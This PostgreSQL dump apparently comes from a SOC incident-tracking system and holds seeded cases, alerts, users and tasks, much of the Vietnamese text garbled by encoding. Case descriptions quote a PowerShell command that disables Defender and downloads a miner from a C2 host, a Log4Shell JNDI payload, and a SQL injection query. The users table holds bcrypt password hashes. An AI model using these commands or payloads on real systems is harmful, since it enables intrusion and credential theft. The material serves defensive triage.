--
-- PostgreSQL database dump
--

\restrict l0tckmDlpyh4dWRef1fYLGju5SxghtcSTq4r36pc5fekfZr2ZaZbRf8bexODsmA

-- Dumped from database version 16.12
-- Dumped by pg_dump version 16.12

SET statement_timeout = 0;
SET lock_timeout = 0;
SET idle_in_transaction_session_timeout = 0;
SET client_encoding = 'UTF8';
SET standard_conforming_strings = on;
SELECT pg_catalog.set_config('search_path', '', false);
SET check_function_bodies = false;
SET xmloption = content;
SET client_min_messages = warning;
SET row_security = off;

--
-- Data for Name: cases; Type: TABLE DATA; Schema: public; Owner: thehive
--

INSERT INTO public.cases VALUES ('10000000-0000-0000-0000-000000000001', NULL, 1001, 'Phishing campaign targeting finance mailbox', 'Multiple finance users received a Microsoft 365 themed invoice lure. Initial triage found a credential harvesting URL and one submitted password reset request.', 2, 2, 2, 'Open', 'nghia.dinh@ncsgroup.vn', 'nghia.dinh@ncsgroup.vn', '{phishing,m365,finance,tlp:amber}', '2026-05-19 12:48:27.755019+00', NULL, '2026-05-19 12:48:27.755019+00', '2026-05-21 12:13:27.755019+00', true, 'Finance phishing wave: validate recipients, block URL, and check for credential use.', 'WithImpact', 'Indeterminate', 'Phishing - Standard Triage', 'NCS SOC', '{"NCS SOC",Finance}', NULL, '{}');
INSERT INTO public.cases VALUES ('10000000-0000-0000-0000-000000000002', NULL, 1002, 'Suspicious encoded PowerShell on endpoint', 'EDR detected encoded PowerShell launched by winword.exe on a user laptop. Analyst must validate command line, collect process tree and isolate if malicious.', 3, 2, 2, 'Open', 'nghia.dinh@ncsgroup.vn', 'soc-l2@ncsgroup.vn', '{edr,powershell,endpoint,attack:T1059}', '2026-05-20 12:48:27.755019+00', NULL, '2026-05-20 12:48:27.755019+00', '2026-05-21 12:30:27.755019+00', true, 'High severity endpoint investigation for suspicious PowerShell execution.', 'NoImpact', 'Indeterminate', 'Endpoint Malware Triage', 'NCS SOC', '{"NCS SOC","IT Operations"}', NULL, '{}');
INSERT INTO public.cases VALUES ('10000000-0000-0000-0000-000000000003', NULL, 1003, 'Resolved malware callback after proxy alert', 'Proxy logs showed a workstation contacting a known C2 domain. Host was isolated and no persistence was found after enrichment.', 1, 2, 2, 'Resolved', 'nghia.dinh@ncsgroup.vn', 'certuser@thehive.local', '{malware,proxy,c2,resolved}', '2026-05-14 12:48:27.755019+00', '2026-05-19 12:48:27.755019+00', '2026-05-14 12:48:27.755019+00', '2026-05-19 12:48:27.755019+00', false, 'Resolved C2 callback: host contained, IOC blocked, no additional beaconing observed.', 'NoImpact', 'TruePositive', 'Malware Callback Triage', 'NCS SOC', '{"NCS SOC","IT Operations"}', NULL, '{}');
INSERT INTO public.cases VALUES ('10000000-0000-0000-0000-000000000040', NULL, 8, 'Ph├ít hiß╗çn m├ú ─æß╗Öc Ransomware m├ú h├│a dß╗» liß╗çu tr├¬n Server kß║┐ to├ín', '## Ph├ón t├¡ch sß╗▒ cß╗æ
Hß╗ç thß╗æng gi├ím s├ít EDR ph├ít hiß╗çn tiß║┐n tr├¼nh `cmd.exe` thß╗▒c thi ─æoß║ín m├ú PowerShell ─æ├íng ngß╗Ø ─æß╗â v├┤ hiß╗çu h├│a Windows Defender v├á m├ú h├│a to├án bß╗Ö dß╗» liß╗çu tr├¬n thã░ mß╗Ñc chia sß║╗ kß║┐ to├ín (`D:\Accounting_Data`).

### Th├┤ng tin kß╗╣ thuß║¡t tß╗½ SIEM:
- **Hostname**: NCS-ACC-SRV01
- **IP Address**: 192.168.1.55
- **OS Version**: Windows Server 2019 Datacenter
- **Process Tree**: `explorer.exe` -> `cmd.exe` -> `powershell.exe`
- **CommandLine**: `powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "Stop-Service -Name Windefend; Invoke-WebRequest -Uri http://c2.malicious-domain.xyz/miner.exe -OutFile C:\Windows\Temp\miner.exe"`

### Timeline:
- **08:15 AM**: Cß║únh b├ío EDR k├¡ch hoß║ít.
- **08:20 AM**: SOC Analyst tiß║┐p nhß║¡n v├á c├┤ lß║¡p m├íy chß╗º.
- **08:35 AM**: Qu├®t v├á tr├¡ch xuß║Ñt IOCs.

Y├¬u cß║ºu ─æß╗Öi ng┼® phß║ún ß╗®ng sß╗▒ cß╗æ nhanh ch├│ng kiß╗âm tra v├á restore bß║ún backup gß║ºn nhß║Ñt.', 3, 2, 2, 'Open', 'nghia.dinh@ncsgroup.vn', '', '{ransomware,critical,finance,windows,mitre-attack}', '2026-05-21 10:48:29.582962+00', NULL, '2026-05-21 10:48:29.582962+00', '2026-05-21 12:43:29.582962+00', true, 'Ransomware l├óy nhiß╗àm m├íy chß╗º kß║┐ to├ín, EDR ─æ├ú c├┤ lß║¡p.', 'WithImpact', 'Indeterminate', 'Ransomware Incident Response', 'NCS SOC', '{"NCS SOC",Finance}', NULL, '{}');
INSERT INTO public.cases VALUES ('10000000-0000-0000-0000-000000000041', NULL, 5, 'Chiß║┐n dß╗ïch Phishing nhß║»m v├áo bß╗Ö phß║¡n H├ánh ch├¡nh Nh├ón sß╗▒', '## Ph├ón t├¡ch sß╗▒ cß╗æ
Hß╗ç thß╗æng Mail Gateway chß║Àn ─æã░ß╗úc mß╗Öt loß║ít email lß╗½a ─æß║úo mß║ío danh th├┤ng b├ío n├óng cß║Ñp lã░ãíng gß╗¡i ─æß║┐n ph├▓ng H├ánh ch├¡nh. Tuy nhi├¬n, c├│ 3 user ─æ├ú click v├áo link v├á nhß║¡p th├┤ng tin.

### Th├┤ng tin kß╗╣ thuß║¡t tß╗½ SIEM:
- **Alert Rule**: Phishing Link Clicked - Azure AD
- **Email Subject**: "[NCS-HR] Thong bao dieu chinh muc luong va tro cap nam 2026"
- **Phishing URL**: `http://hr-salary-update.ncsgroup.xyz/login`
- **Affected Users**: `nguyen.van.a@ncsgroup.vn`, `tran.thi.b@ncsgroup.vn`, `le.van.c@ncsgroup.vn`

### Actions Taken:
- Force reset password cho 3 user bß╗ï ß║únh hã░ß╗ƒng.
- Block domain lß╗½a ─æß║úo tr├¬n Firewall.
- Qu├®t c├íc email tã░ãíng tß╗▒ trong to├án hß╗ç thß╗æng.', 2, 2, 2, 'InProgress', 'nghia.dinh@ncsgroup.vn', 'analyst1@ncsgroup.vn', '{phishing,email,hr,credential-harvesting}', '2026-05-20 12:48:29.582962+00', NULL, '2026-05-20 12:48:29.582962+00', '2026-05-21 12:18:29.582962+00', false, 'Phishing email mß║ío danh nh├ón sß╗▒, 3 user ─æ├ú lß╗Ö lß╗ìt mß║¡t khß║®u, ─æ├ú reset.', 'WithImpact', 'Indeterminate', 'Phishing Triage', 'NCS SOC', '{"NCS SOC",HR}', NULL, '{}');
INSERT INTO public.cases VALUES ('10000000-0000-0000-0000-000000000042', NULL, 7, 'Cß║únh b├ío tuß╗ôn dß╗» liß╗çu nhß║íy cß║úm ra ngo├ái qua OneDrive c├í nh├ón', '## Ph├ón t├¡ch sß╗▒ cß╗æ
DLP (Data Loss Prevention) ph├ít hiß╗çn m├íy t├¡nh cß╗ºa nh├ón vi├¬n `NVA01` tß║úi l├¬n mß╗Öt file ZIP nß║Àng 2GB chß╗®a nhiß╗üu file t├ái liß╗çu nß╗Öi bß╗Ö l├¬n mß╗Öt t├ái khoß║ún Microsoft OneDrive c├í nh├ón.

### Th├┤ng tin kß╗╣ thuß║¡t tß╗½ SIEM:
- **Hostname**: NCS-HR-PC10
- **User Account**: `nva01@ncsgroup.vn`
- **File Name**: `Q1-Finance-Report_Confidential.zip`
- **Target URL**: `https://onedrive.live.com/personal-upload`
- **Rule Triggered**: DLP - Confidential Data Uploaded to Cloud Storage

Y├¬u cß║ºu ─æiß╗üu tra xem ─æ├óy l├á h├ánh vi v├┤ ├¢ hay cß╗æ ├¢ tß╗½ nß╗Öi bß╗Ö (Insider Threat). ─É├ú tß║ím kh├│a t├ái khoß║ún VPN cß╗ºa nh├ón vi├¬n.', 3, 3, 2, 'Open', 'nghia.dinh@ncsgroup.vn', '', '{dlp,insider-threat,data-leak,confidential-data}', '2026-05-21 07:48:29.582962+00', NULL, '2026-05-21 07:48:29.582962+00', '2026-05-21 11:48:29.582962+00', true, 'Cß║únh b├ío DLP: Nh├ón vi├¬n n├®n 2GB dß╗» liß╗çu nß╗Öi bß╗Ö tß║úi l├¬n OneDrive.', 'WithImpact', 'Indeterminate', 'Insider Threat Investigation', 'NCS SOC', '{"NCS SOC","Internal Security"}', NULL, '{}');
INSERT INTO public.cases VALUES ('10000000-0000-0000-0000-000000000043', NULL, 4, 'Tß║Ñn c├┤ng SQL Injection v├áo cß╗òng th├┤ng tin kh├ích h├áng', '## Ph├ón t├¡ch sß╗▒ cß╗æ
WAF (Web Application Firewall) ghi nhß║¡n lã░ß╗úng lß╗øn request chß╗®a c├íc payload SQLi nhß║»m v├áo endpoint `/api/v1/customer/search` tr├¬n Cß╗òng th├┤ng tin kh├ích h├áng.

### Th├┤ng tin kß╗╣ thuß║¡t tß╗½ SIEM:
- **Alert Source**: Cloudflare WAF
- **Target URI**: `/api/v1/customer/search?query=1 UNION SELECT username, password FROM users--`
- **Attacker IP**: `114.114.114.114` (Proxy, VPN)
- **HTTP Status**: 403 Forbidden (Blocked by WAF)

IP tß║Ñn c├┤ng ─æß║┐n tß╗½ nhiß╗üu dß║úi mß║íng ß║®n danh. Hß╗ç thß╗æng WAF ─æ├ú tß╗▒ ─æß╗Öng block, tuy nhi├¬n cß║ºn Dev check lß║íi log xem c├│ request n├áo lß╗ìt qua kh├┤ng.', 2, 1, 1, 'Closed', 'nghia.dinh@ncsgroup.vn', 'web-sec@ncsgroup.vn', '{sqli,waf,public-web,owasp-top10}', '2026-05-18 12:48:29.582962+00', '2026-05-19 12:48:29.582962+00', '2026-05-18 12:48:29.582962+00', '2026-05-19 12:48:29.582962+00', false, 'WAF chß║Àn 5000+ request SQLi, kh├┤ng c├│ dß╗» liß╗çu bß╗ï r├▓ rß╗ë.', 'NoImpact', 'TruePositive', 'Web Application Attack', 'NCS SOC', '{"NCS SOC","Public Web"}', NULL, '{}');
INSERT INTO public.cases VALUES ('10000000-0000-0000-0000-000000000044', NULL, 10, 'Brute Force th├ánh c├┤ng v├áo t├ái khoß║ún VPN cß╗ºa sß║┐p', '## Ph├ón t├¡ch sß╗▒ cß╗æ
Hß╗ç thß╗æng SIEM ghi nhß║¡n t├ái khoß║ún VPN cß╗ºa Gi├ím ─æß╗æc (CEO) bß╗ï brute-force li├¬n tß╗Ñc tß╗½ c├íc IP Trung Quß╗æc v├á Nga. Sau 300 lß║ºn thß╗¡, ─æ├ú c├│ 1 lß║ºn ─æ─âng nhß║¡p th├ánh c├┤ng.

### Th├┤ng tin kß╗╣ thuß║¡t tß╗½ SIEM:
- **Affected Account**: `ceo@ncsgroup.vn`
- **Total Attempts**: 342 Failed Logins, 1 Success Login
- **Source IPs**: `114.114.114.114`
- **MFA Status**: Blocked by Authenticator (User rejected)

Rß║Ñt may hß╗ç thß╗æng OTP ─æ├ú chß║Àn lß║íi, tuy nhi├¬n mß║¡t khß║®u cß╗ºa CEO ─æ├ú bß╗ï lß╗Ö. Cß║ºn xß╗¡ l├¢ khß║®n cß║Ñp.', 3, 2, 2, 'Open', 'nghia.dinh@ncsgroup.vn', '', '{brute-force,vpn,compromised-credential,active-directory}', '2026-05-21 12:18:29.582962+00', NULL, '2026-05-21 12:18:29.582962+00', '2026-05-21 12:38:29.582962+00', true, 'T├ái khoß║ún VPN bß╗ï d├▓ pass th├ánh c├┤ng, ─æ├ú bß╗ï chß║Àn bß╗ƒi MFA.', 'NoImpact', 'Indeterminate', 'Credential Compromise', 'NCS SOC', '{"NCS SOC","IT Operations"}', NULL, '{}');
INSERT INTO public.cases VALUES ('10000000-0000-0000-0000-000000000045', NULL, 3, 'M├íy chß╗º Linux Development bß╗ï c├ái m├ú ─æß╗Öc Cryptominer', '## Ph├ón t├¡ch sß╗▒ cß╗æ
Cloud Monitor b├ío ─æß╗Öng CPU cß╗ºa m├íy chß╗º `Dev-Docker-01` t─âng l├¬n 100% trong 24h qua. Ph├ón t├¡ch tiß║┐n tr├¼nh ph├ít hiß╗çn file `xmrig` ─æang chß║íy ngß║ºm dã░ß╗øi quyß╗ün user `www-data`.

### Th├┤ng tin kß╗╣ thuß║¡t tß╗½ SIEM:
- **Hostname**: Dev-Docker-01
- **OS Version**: Ubuntu 22.04 LTS
- **Process Path**: `/var/tmp/xmrig`
- **MD5 Hash**: `c2b53b8f52afab92b6a07e923838274d`
- **Impact**: CPU 100% Core Utilization

Khß║ú n─âng m├íy chß╗º ─æ├ú bß╗ï khai th├íc qua mß╗Öt lß╗ù hß╗òng RCE cß╗ºa ß╗®ng dß╗Ñng web c┼®.', 2, 2, 2, 'Closed', 'nghia.dinh@ncsgroup.vn', 'soc-l1@ncsgroup.vn', '{malware,cryptominer,linux,rce}', '2026-05-16 12:48:29.582962+00', '2026-05-17 12:48:29.582962+00', '2026-05-16 12:48:29.582962+00', '2026-05-17 12:48:29.582962+00', false, 'X├│a bß╗Å cryptominer, v├í lß╗ù hß╗òng RCE tr├¬n container web.', 'WithImpact', 'TruePositive', 'Malware Cleanup', 'NCS SOC', '{"NCS SOC",DevOps}', NULL, '{}');
INSERT INTO public.cases VALUES ('10000000-0000-0000-0000-000000000046', NULL, 6, 'C2 Beaconing tß╗½ m├íy trß║ím kß║┐ to├ín ─æß║┐n IP lß║í', '## Ph├ón t├¡ch sß╗▒ cß╗æ
Firewall b├ío c├ío m├íy trß║ím `PC-KT-05` (IP: 10.0.5.22) li├¬n tß╗Ñc gß╗¡i c├íc g├│i tin HTTPS ─æß╗üu ─æß║Àn 5 ph├║t/lß║ºn (beaconing) ra mß╗Öt ─æß╗ïa chß╗ë IP thuß╗Öc danh s├ích t├¼nh b├ío mß║íng (C2 Cobalt Strike).

### Th├┤ng tin kß╗╣ thuß║¡t tß╗½ SIEM:
- **Source IP**: `10.0.5.22` (PC-KT-05)
- **Destination Domain**: `api.update-windows.xyz`
- **Interval**: 300s Jitter 10%
- **Signature**: Cobalt Strike Beacon HTTPS Activity

Tiß║┐n h├ánh c├┤ lß║¡p m├íy v├á thu thß║¡p memory dump ─æß╗â ph├ón t├¡ch m├ú ─æß╗Öc.', 3, 2, 2, 'InProgress', 'nghia.dinh@ncsgroup.vn', 'soc-l2@ncsgroup.vn', '{c2,beaconing,cobalt-strike,compromised-host}', '2026-05-21 02:48:29.582962+00', NULL, '2026-05-21 02:48:29.582962+00', '2026-05-21 10:48:29.582962+00', true, 'Ph├ít hiß╗çn beaconing Cobalt Strike tß╗½ m├íy kß║┐ to├ín, ─æang ─æiß╗üu tra memory.', 'Indeterminate', 'Indeterminate', 'Malware Callback Triage', 'NCS SOC', '{"NCS SOC",Finance}', NULL, '{}');
INSERT INTO public.cases VALUES ('10000000-0000-0000-0000-000000000047', NULL, 2, 'Ph├ít hiß╗çn d├▓ qu├®t lß╗ù hß╗òng Log4j tr├¬n hß╗ç thß╗æng CRM', '## Ph├ón t├¡ch sß╗▒ cß╗æ
IPS ph├ít hiß╗çn nhiß╗üu chuß╗ùi JNDI lookup `\${jndi:ldap://malicious.com/a}` trong User-Agent cß╗ºa c├íc request gß╗¡i ─æß║┐n CRM. 

### Th├┤ng tin kß╗╣ thuß║¡t tß╗½ SIEM:
- **Alert Source**: Cisco IPS
- **Payload**: `User-Agent: ${jndi:ldap://api.update-windows.xyz/a}`
- **Target IP**: `192.168.10.15` (CRM-WebServer)
- **Vulnerability**: CVE-2021-44228 (Log4Shell)

Hß╗ç thß╗æng CRM sß╗¡ dß╗Ñng Java nhã░ng ─æ├ú ─æã░ß╗úc v├í Log4j tß╗½ n─âm ngo├íi. Tuy nhi├¬n cß║ºn r├á so├ít lß║íi to├án bß╗Ö ß╗®ng dß╗Ñng nß╗Öi bß╗Ö xem c├│ d├¡nh kh├┤ng.', 1, 1, 1, 'Closed', 'nghia.dinh@ncsgroup.vn', 'soc-l1@ncsgroup.vn', '{log4j,rce,scanning,cve-2021-44228}', '2026-05-11 12:48:29.582962+00', '2026-05-12 12:48:29.582962+00', '2026-05-11 12:48:29.582962+00', '2026-05-12 12:48:29.582962+00', false, 'Chß╗ë l├á d├▓ qu├®t tß╗▒ ─æß╗Öng tß╗½ botnet, hß╗ç thß╗æng ─æ├ú v├í kh├┤ng bß╗ï ß║únh hã░ß╗ƒng.', 'NoImpact', 'FalsePositive', 'Vulnerability Scanning', 'NCS SOC', '{"NCS SOC","CRM Team"}', NULL, '{}');
INSERT INTO public.cases VALUES ('10000000-0000-0000-0000-000000000048', NULL, 1, 'Tß║Ñn c├┤ng DDoS l├ám gi├ín ─æoß║ín cß╗òng API thanh to├ín', '## Ph├ón t├¡ch sß╗▒ cß╗æ
B─âng th├┤ng mß║íng t─âng vß╗ìt l├¬n 50Gbps v├áo l├║c 19:00, l├ám ngß║¡p lß╗Ñt cß╗òng API thanh to├ín. C├íc request phß║ºn lß╗øn l├á HTTP GET flood tß╗½ h├áng ng├án IP proxy kh├íc nhau.

### Th├┤ng tin kß╗╣ thuß║¡t tß╗½ SIEM:
- **DDoS Target**: `https://api.ncsgroup.vn/v1/payment`
- **Traffic Volume**: Peak 52.4 Gbps, 8.4 Mpps
- **Attack Vector**: Layer 7 HTTP GET Flood / Syn Flood
- **Cloudflare Action**: Under Attack Mode Enabled

─É├ú bß║¡t chß║┐ ─æß╗Ö Anti-DDoS tr├¬n Cloudflare v├á ph├ón luß╗ông traffic.', 3, 1, 1, 'Closed', 'nghia.dinh@ncsgroup.vn', 'net-admin@ncsgroup.vn', '{ddos,botnet,availability,cloudflare}', '2026-05-01 12:48:29.582962+00', '2026-05-02 12:48:29.582962+00', '2026-05-01 12:48:29.582962+00', '2026-05-02 12:48:29.582962+00', true, 'Gi├ín ─æoß║ín dß╗ïch vß╗Ñ 45 ph├║t do DDoS, ─æ├ú xß╗¡ l├¢ bß║▒ng Cloudflare.', 'WithImpact', 'TruePositive', 'Network Attack', 'NCS SOC', '{"NCS SOC","Network Infrastructure"}', NULL, '{}');
INSERT INTO public.cases VALUES ('10000000-0000-0000-0000-000000000049', NULL, 9, 'T├ái khoß║ún O365 bß╗ï x├óm nhß║¡p v├á tß║ío rule forwarding lß║í', '## Ph├ón t├¡ch sß╗▒ cß╗æ
Microsoft 365 Defender cß║únh b├ío t├ái khoß║ún `sale-director@ncsgroup.vn` ─æ─âng nhß║¡p th├ánh c├┤ng tß╗½ Nigeria (Impossible Travel), sau ─æ├│ lß║¡p tß╗®c tß║ío Inbox Rule chuyß╗ân tiß║┐p (forward) to├án bß╗Ö email c├│ chß╗» "invoice", "payment" sang mß╗Öt ─æß╗ïa chß╗ë Gmail b├¬n ngo├ái.

### Th├┤ng tin kß╗╣ thuß║¡t tß╗½ SIEM:
- **Affected User**: `sale-director@ncsgroup.vn`
- **Impossible Travel**: Login from VN (18:10), Login from NG (18:15)
- **Inbox Rule Name**: "." (Hidden rule)
- **Inbox Rule Action**: Forward to `attacker-drop@gmail.com`

─É├óy l├á dß║Ñu hiß╗çu r├Á r├áng cß╗ºa tß║Ñn c├┤ng BEC (Business Email Compromise).', 3, 2, 2, 'Open', 'nghia.dinh@ncsgroup.vn', '', '{bec,o365,impossible-travel,email-forwarding}', '2026-05-21 11:48:29.582962+00', NULL, '2026-05-21 11:48:29.582962+00', '2026-05-21 12:38:29.582962+00', true, 'T├ái khoß║ún Gi├ím ─æß╗æc Sales bß╗ï chiß║┐m quyß╗ün, tß║ío rule tuß╗ôn email t├ái ch├¡nh ra ngo├ái.', 'WithImpact', 'Indeterminate', 'BEC Investigation', 'NCS SOC', '{"NCS SOC",Sales}', NULL, '{}');


--
-- Data for Name: alerts; Type: TABLE DATA; Schema: public; Owner: thehive
--

INSERT INTO public.alerts VALUES ('20000000-0000-0000-0000-000000000001', NULL, 'MISP event: finance invoice credential phishing', 'misp-event', 'MISP', 'MISP-2026-0427-091', 2, 2, 'Imported', false, '10000000-0000-0000-0000-000000000001', '{misp,phishing,finance}', '2026-05-19 10:48:27.755019+00', '2026-05-19 11:48:27.755019+00', '2026-05-21 12:18:27.755019+00', 'MISP event containing sender, phishing URL and target sector tags. Imported into the finance phishing case.', 'https://misp.local/events/view/91', '2026-05-21 12:18:27.755019+00', 2, true, true, 'NCS SOC', 'Phishing - Standard Triage', NULL);
INSERT INTO public.alerts VALUES ('20000000-0000-0000-0000-000000000002', NULL, 'EDR alert: encoded PowerShell spawned by Office', 'edr', 'Microsoft Defender', 'MDE-6F3A-2219', 3, 2, 'New', false, '10000000-0000-0000-0000-000000000002', '{edr,powershell,attack:T1059}', '2026-05-20 11:48:27.755019+00', '2026-05-20 12:48:27.755019+00', '2026-05-21 12:33:27.755019+00', 'Endpoint detection for suspicious parent-child process chain winword.exe -> powershell.exe with encoded command.', 'https://edr.local/alerts/MDE-6F3A-2219', '2026-05-21 12:33:27.755019+00', 2, true, true, 'NCS SOC', 'Endpoint Malware Triage', NULL);
INSERT INTO public.alerts VALUES ('20000000-0000-0000-0000-000000000003', NULL, 'Proxy alert: workstation contacted known C2 domain', 'proxy', 'Secure Web Gateway', 'SWG-4421-C2', 1, 2, 'Imported', true, '10000000-0000-0000-0000-000000000003', '{proxy,c2,resolved}', '2026-05-14 11:48:27.755019+00', '2026-05-14 12:48:27.755019+00', '2026-05-19 12:48:27.755019+00', 'Proxy detection for a domain previously tagged as command and control. Case already resolved after containment.', 'https://proxy.local/search?q=SWG-4421-C2', '2026-05-19 12:48:27.755019+00', 2, false, false, 'NCS SOC', 'Malware Callback Triage', NULL);


--
-- Data for Name: alert_custom_fields; Type: TABLE DATA; Schema: public; Owner: thehive
--



--
-- Data for Name: organisations; Type: TABLE DATA; Schema: public; Owner: thehive
--

INSERT INTO public.organisations VALUES ('2eba591c-22de-493e-8266-0fccc835dbdc', 'PVO', 'PVO Corporation ÔÇö client organisation', '2026-05-21 12:48:29.35027+00', '2026-05-21 12:48:29.35027+00');
INSERT INTO public.organisations VALUES ('84dcc988-a216-4479-952b-0e22b8b57091', 'NCS', 'Default organisation', '2026-05-21 12:48:29.396933+00', '2026-05-21 12:48:29.396933+00');


--
-- Data for Name: profiles; Type: TABLE DATA; Schema: public; Owner: thehive
--

INSERT INTO public.profiles VALUES ('287c2b6f-34af-4a27-83dd-387499e0c481', 'admin', '{accessTheHiveFS,manageAction,manageAlert,manageAnalyse,manageAnalyzerTemplate,manageCase,manageCaseTemplate,manageConfig,manageCustomField,manageObservable,manageObservableTemplate,manageOrganisation,managePage,managePattern,managePlatform,manageProcedure,manageProfile,manageShare,manageTag,manageTask,manageTaxonomy,manageUser}', '2026-05-21 12:48:26.386889+00', '2026-05-21 12:48:28.156172+00');
INSERT INTO public.profiles VALUES ('86d080bc-0a1c-4937-9a37-026b478f1fba', 'org-admin', '{manageCase,manageAlert,manageObservable,manageTask,manageUser,manageTag,manageCustomField,manageTemplate,managePage,manageDashboard,manageNotification,manageTaxonomy,managePattern,manageAction}', '2026-05-21 12:48:29.35027+00', '2026-05-21 12:48:29.35027+00');
INSERT INTO public.profiles VALUES ('f33e6483-4ada-4053-8515-ed1e198b2fa1', 'client', '{manageCase,manageTask}', '2026-05-21 12:48:29.35027+00', '2026-05-21 12:48:29.35027+00');


--
-- Data for Name: users; Type: TABLE DATA; Schema: public; Owner: thehive
--

INSERT INTO public.users VALUES ('8ae7e1c8-87de-42e0-a7aa-957ff759b3e8', 'ncs_admin@ncsgroup.vn', 'NCS Administrator', NULL, '287c2b6f-34af-4a27-83dd-387499e0c481', 'Ok', '2026-05-21 12:48:26.386889+00', '2026-05-21 12:48:29.35027+00', '$2a$10$JIxik0.d1jEmIoDAUWTKUeR4kSul1ka.q6ef7Q4HA9U8ULDjBmeoa', false, NULL, false, NULL, 'bcrypt', NULL, false, 0, NULL, NULL, 4, false);
INSERT INTO public.users VALUES ('28fd4be2-d006-41f7-b024-9ec71e1dc2a5', 'nghia.dinh@ncsgroup.vn', 'Nghia Dinh', NULL, '86d080bc-0a1c-4937-9a37-026b478f1fba', 'Ok', '2026-05-21 12:48:26.516763+00', '2026-05-21 12:48:29.35027+00', '$2a$10$df0oYFlmSfEFYZsnph9pVe866YEN/NbrcgcYOBromzea9o9HoRbxu', false, NULL, false, '2026-05-21 12:48:26.884985+00', 'bcrypt', NULL, false, 0, NULL, NULL, 4, false);
INSERT INTO public.users VALUES ('ae7efded-7516-43b1-ab34-60b3b03ebba1', 'dat.tran@pvo.com.vn', 'Dat Tran', '2eba591c-22de-493e-8266-0fccc835dbdc', '86d080bc-0a1c-4937-9a37-026b478f1fba', 'Ok', '2026-05-21 12:48:29.35027+00', '2026-05-21 12:48:29.35027+00', '$2a$10$JIxik0.d1jEmIoDAUWTKUeR4kSul1ka.q6ef7Q4HA9U8ULDjBmeoa', false, NULL, false, NULL, 'bcrypt', NULL, false, 0, NULL, NULL, 4, false);
INSERT INTO public.users VALUES ('479be83e-ea0a-4d53-8dbd-57aa2c4daabd', 'ncs.fushion_admin@ncsgroup.vn', 'NCS Fusion Admin', '84dcc988-a216-4479-952b-0e22b8b57091', '287c2b6f-34af-4a27-83dd-387499e0c481', 'Locked', '2026-05-21 12:48:29.54204+00', '2026-05-21 12:48:29.669993+00', '$2a$10$df0oYFlmSfEFYZsnph9pVe866YEN/NbrcgcYOBromzea9o9HoRbxu', true, NULL, true, '2026-05-21 12:48:29.54204+00', 'bcrypt', NULL, false, 0, NULL, NULL, 4, false);


--
-- Data for Name: api_keys; Type: TABLE DATA; Schema: public; Owner: thehive
--



--
-- Data for Name: app_metadata; Type: TABLE DATA; Schema: public; Owner: thehive
--

INSERT INTO public.app_metadata VALUES ('app_version', '0.1.0', '2026-05-21 12:48:25.763574+00');
INSERT INTO public.app_metadata VALUES ('schema_baseline', '1', '2026-05-21 12:48:25.763574+00');
INSERT INTO public.app_metadata VALUES ('search_index_ver', '0', '2026-05-21 12:48:25.763574+00');


--
-- Data for Name: archive_links; Type: TABLE DATA; Schema: public; Owner: thehive
--



--
-- Data for Name: task_items; Type: TABLE DATA; Schema: public; Owner: thehive
--

INSERT INTO public.task_items VALUES ('dd756b4b-34db-4d1e-a7b4-bfebe388b00b', '10000000-0000-0000-0000-000000000001', 'Review email headers', 'InProgress', 'nghia.dinh@ncsgroup.vn', 'Triage', 1, '2026-05-19 12:48:27.755019+00', '2026-05-21 12:08:27.755019+00', 'Validate SPF/DKIM/DMARC and identify sender infrastructure.', true, '2026-05-19 12:48:27.755019+00', NULL, '2026-05-21 16:48:27.755019+00', '{"NCS SOC",Finance}');
INSERT INTO public.task_items VALUES ('a7ab5663-3603-43d3-b48c-d168ee7e0f2d', '10000000-0000-0000-0000-000000000001', 'Collect affected recipients', 'Waiting', '', 'Triage', 2, '2026-05-19 12:48:27.755019+00', '2026-05-21 11:48:27.755019+00', 'Confirm targeted mailbox list and whether credentials were submitted.', false, NULL, NULL, '2026-05-21 20:48:27.755019+00', '{"NCS SOC",Finance}');
INSERT INTO public.task_items VALUES ('d2a8c761-a4a2-424a-8841-3e7d24ca0b4c', '10000000-0000-0000-0000-000000000002', 'Validate encoded PowerShell', 'InProgress', 'soc-l2@ncsgroup.vn', 'Investigation', 1, '2026-05-20 12:48:27.755019+00', '2026-05-21 12:30:27.755019+00', 'Decode command and compare against known malicious launchers.', true, '2026-05-20 16:48:27.755019+00', NULL, '2026-05-21 14:48:27.755019+00', '{"NCS SOC","IT Operations"}');
INSERT INTO public.task_items VALUES ('5cfebaa3-c6b0-4f63-9cb8-9e698f7e5601', '10000000-0000-0000-0000-000000000003', 'Document containment result', 'Completed', 'certuser@thehive.local', 'Closure', 1, '2026-05-14 12:48:27.755019+00', '2026-05-19 12:48:27.755019+00', 'Record proxy block, host isolation and no-persistence finding.', false, '2026-05-15 12:48:27.755019+00', NULL, '2026-05-19 12:48:27.755019+00', '{"NCS SOC","IT Operations"}');
INSERT INTO public.task_items VALUES ('d2e678c9-bb6e-4994-9220-7299ec8c53c5', '10000000-0000-0000-0000-000000000040', 'C├┤ lß║¡p m├íy chß╗º bß╗ï nhiß╗àm', 'Completed', 'soc-l2@ncsgroup.vn', 'Containment', 1, '2026-05-21 11:48:29.582962+00', '2026-05-21 12:03:29.582962+00', 'Chß║Àn IP khß╗Åi mß║íng nß╗Öi bß╗Ö v├á Internet.', false, '2026-05-21 11:48:29.582962+00', NULL, '2026-05-21 13:48:29.582962+00', '{"NCS SOC",Finance}');
INSERT INTO public.task_items VALUES ('0f03627e-5d9c-4642-9321-7267508a6912', '10000000-0000-0000-0000-000000000040', 'Tr├¡ch xuß║Ñt IOCs', 'InProgress', 'soc-l2@ncsgroup.vn', 'Analysis', 2, '2026-05-21 11:48:29.582962+00', '2026-05-21 12:43:29.582962+00', 'Ph├ón t├¡ch file thß╗▒c thi v├á PowerShell logs.', true, '2026-05-21 12:03:29.582962+00', NULL, '2026-05-21 14:48:29.582962+00', '{"NCS SOC",Finance}');
INSERT INTO public.task_items VALUES ('de21492c-317b-4e4e-9411-0dc351d52d76', '10000000-0000-0000-0000-000000000040', 'Kh├┤i phß╗Ñc dß╗» liß╗çu', 'Waiting', '', 'Recovery', 3, '2026-05-21 11:48:29.582962+00', '2026-05-21 11:48:29.582962+00', 'Restore tß╗½ Veeam Backup ng├áy h├┤m qua.', false, NULL, NULL, '2026-05-22 12:48:29.582962+00', '{"NCS SOC",Finance}');
